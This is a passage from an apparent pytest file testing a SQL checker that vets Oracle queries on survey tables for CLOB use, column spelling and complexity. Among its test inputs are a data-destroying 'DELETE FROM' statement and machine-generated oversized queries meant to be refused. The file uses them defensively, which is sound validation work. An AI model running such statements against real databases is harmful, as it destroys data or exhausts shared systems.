            # DECODE with a NULL first result gives text.
            f"SELECT DISTINCT DECODE(SURVEYNAME, 'x', NULL, QUESTIONTEXT) FROM {D}",
            f"SELECT 1 FROM {D} a JOIN {D} b USING (SURVEYNAME)",
            f"SELECT LISTAGG(TO_CHAR(SUBSTR(QUESTIONTEXT, 1, 50)), '; ') "
            f"WITHIN GROUP (ORDER BY SURVEYNAME) FROM {D}",
            f"WITH d AS (SELECT TO_CHAR(SUBSTR(QUESTIONTEXT, 1, 500)) q FROM {D}) "
            "SELECT DISTINCT q FROM d ORDER BY q",
            f"SELECT q FROM (SELECT QUESTIONTEXT q, SURVEYNAME s FROM {D}) ORDER BY s",
            f"SELECT 1 FROM {D} a WHERE EXISTS (SELECT 1 FROM {D} b WHERE b.QUESTIONTEXT IS NULL)",
        ],
    )
    def test_what_oracle_does_with_a_clob(self, sql):
        survey_ok(sql)

    def test_with_types_it_cant_work_out_nothing_is_refused(self):
        # No catalog: nothing is known to be a CLOB.
        ok(f"SELECT DISTINCT QUESTIONTEXT FROM {D} ORDER BY QUESTIONTEXT")


class TestSpelling:
    """Oracle upper-cases an unquoted name, and a quoted one must match exactly."""

    NEEDS_QUOTES = '"Bdate" is spelled with lower-case letters, so Oracle needs it in double quotes, exactly: "Bdate".'  # noqa: E501

    @pytest.mark.parametrize(
        "sql",
        [
            f"SELECT Bdate FROM {B}",
            f"SELECT b.Bdate FROM {B} b",
            f"SELECT PARTICIPANTIDENTIFIER FROM {B} WHERE BDATE IS NOT NULL",
            f"SELECT COUNT(*) FROM {B} WHERE EXTRACT(YEAR FROM bdate) < 2000",
            f'SELECT "BDATE" FROM {B}',
            f'SELECT "bdate" FROM {B}',
            f"WITH v AS (SELECT * FROM {B}) SELECT bdate FROM v",
        ],
    )
    def test_a_mixed_case_name_needs_its_quotes(self, sql):
        assert survey_rejected(sql) == self.NEEDS_QUOTES

    def test_spaces_and_lower_case(self):
        assert '"Black tea" is spelled with lower-case letters' in survey_rejected(
            f'SELECT "BLACK TEA" FROM {B}'
        )
        assert '"interest0" is spelled' in survey_rejected(f"SELECT interest0 FROM {B}")

    def test_a_quoted_upper_case_name_must_match_too(self):
        message = survey_rejected(f'SELECT "participantidentifier" FROM {B}')
        assert "Write PARTICIPANTIDENTIFIER" in message

    @pytest.mark.parametrize(
        "sql",
        [
            f'SELECT "Bdate", "interest0", "Black tea" FROM {B}',
            f'SELECT b."Bdate" FROM {B} b WHERE b."Bdate" IS NOT NULL',
            f"SELECT participantidentifier, PARTICIPANTIDENTIFIER, ParticipantIdentifier FROM {B}",
            f'SELECT "PARTICIPANTIDENTIFIER" FROM {B}',
        ],
    )
    def test_right_spellings(self, sql):
        survey_ok(sql)

    def test_an_unknown_name_keeps_the_general_message(self):
        assert "could not be resolved" in survey_rejected(f"SELECT NOT_A_COLUMN FROM {B}")


class TestSpellingIsExplainedOnlyForTheNameRefused:
    def test_only_the_name_refused_is_explained(self):
        # From the code review: "Bdate" is right here; NOSUCHCOL is the problem.
        message = survey_rejected(f'SELECT "Bdate" AS bdate FROM {B} ORDER BY bdate, nosuchcol')
        assert "NOSUCHCOL" in message and "Bdate" not in message

    def test_the_rule_is_named_for_the_chat(self):
        with pytest.raises(SqlRejected) as spelling:
            survey_ok(f"SELECT Bdate FROM {B}")
        with pytest.raises(SqlRejected) as lob:
            survey_ok(f"SELECT DISTINCT QUESTIONTEXT FROM {D}")
        with pytest.raises(SqlRejected) as other:
            survey_ok("DELETE FROM IHS_2025.T")
        assert (spelling.value.rule, lob.value.rule, other.value.rule) == (
            "spelling",
            "long_text",
            "check",
        )


TOO_COMPLEX_COLUMNS = {"IHS_2025": {"T": {"A": "VARCHAR2(10)", "Q": "CLOB", "N": "NUMBER"}}}


class TestTooComplex:
    """From the code review: the long-text check was exponential, and deep
    set operations raised RecursionError. Both stay fast, or are refused."""

    def check(self, sql: str):
        return check_sql(sql, allowed_schemas=COHORTS, columns=TOO_COMPLEX_COLUMNS)

    def nested_coalesce(self, levels: int, width: int = 4, column: str = "A") -> str:
        ctes = [f"c0 AS (SELECT {column} x FROM IHS_2025.T)"]
        for i in range(1, levels + 1):
            args = ", ".join([f"c{i - 1}.x"] * width)
            ctes.append(f"c{i} AS (SELECT COALESCE({args}) x FROM c{i - 1})")
        return "WITH " + ", ".join(ctes) + f" SELECT DISTINCT x FROM c{levels}"

    def test_nested_ctes_are_linear(self):
        started = time.monotonic()
        self.check(self.nested_coalesce(16))
        with pytest.raises(SqlRejected, match="is a CLOB"):
            self.check(self.nested_coalesce(16, column="Q"))
        assert time.monotonic() - started < 5

    def test_wide_expressions_are_linear(self):
        # Each level repeats the one below three times: 3**7 leaves.
        expression = "Q"
        for _ in range(7):
            expression = f"NVL({expression}, {expression}) || {expression}"
        started = time.monotonic()
        with pytest.raises(SqlRejected):
            self.check(f"SELECT DISTINCT {expression} FROM IHS_2025.T")
        assert time.monotonic() - started < 5

    def test_many_union_branches(self):
        started = time.monotonic()
        branches = " UNION ".join(["SELECT A FROM IHS_2025.T"] * 1500)
        try:
            self.check(branches)
        except SqlRejected as refused:
            assert refused.rule == "too_complex"
        assert time.monotonic() - started < 60

    @pytest.mark.parametrize(
        "sql",
        [
            # From the re-review: qualify was quadratic on these (72 s, 126 s, 12.6 s).
            "SELECT " + "+".join(["N"] * 21000) + " FROM IHS_2025.T",
            "SELECT DISTINCT " + "||".join(["A"] * 21000) + "||Q FROM IHS_2025.T",
            "SELECT A FROM IHS_2025.T WHERE " + " OR ".join(f"N={i}" for i in range(5000)),
        ],
    )
    def test_64_kb_of_one_operator_is_refused_quickly(self, sql):
        assert len(sql.encode()) <= 64 * 1024
        started = time.monotonic()
        with pytest.raises(SqlRejected) as info:
            self.check(sql)
        assert info.value.rule == "too_complex"
        assert time.monotonic() - started < 5

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT A FROM IHS_2025.T WHERE " + " OR ".join(f"N={i}" for i in range(800)),
            "SELECT A FROM IHS_2025.T WHERE N IN (" + ",".join(map(str, range(6000))) + ")",
            "SELECT " + ", ".join(f"N+{i} AS c{i}" for i in range(2000)) + " FROM IHS_2025.T",
        ],
    )
    def test_large_realistic_queries_still_pass(self, sql):
        started = time.monotonic()
        self.check(sql)
        assert time.monotonic() - started < 5

    def test_deep_nesting_is_refused_not_an_error(self):
        deep = "SELECT " + "UPPER(" * 200 + "A" + ")" * 200 + " FROM IHS_2025.T"
        with pytest.raises(SqlRejected) as info:
            self.check(deep)
        assert info.value.rule == "too_complex"
        assert "too complex" in str(info.value)

    def test_an_unexpected_error_in_the_long_text_rule_refuses(self, monkeypatch):
        from datalab.data import sqlcheck

        def broken(*args, **kwargs):
            raise KeyError("a bug")

        monkeypatch.setattr(sqlcheck, "lob_problem", broken)
        with pytest.raises(SqlRejected, match="couldn't finish checking"):
            self.check("SELECT A FROM IHS_2025.T")

    def test_an_unexpected_error_anywhere_in_the_check_refuses(self, monkeypatch):
        from datalab.data import sqlcheck

        def broken(*args, **kwargs):
            raise AttributeError("a bug")

        monkeypatch.setattr(sqlcheck, "_referenced_tables", broken)
        with pytest.raises(SqlRejected, match="couldn't finish checking") as info:
            self.check("SELECT A FROM IHS_2025.T")
        assert info.value.rule == "too_complex"
        # A refusal itself passes through as it is.
        with pytest.raises(SqlRejected, match="Only SELECT"):
            self.check("DELETE FROM IHS_2025.T")
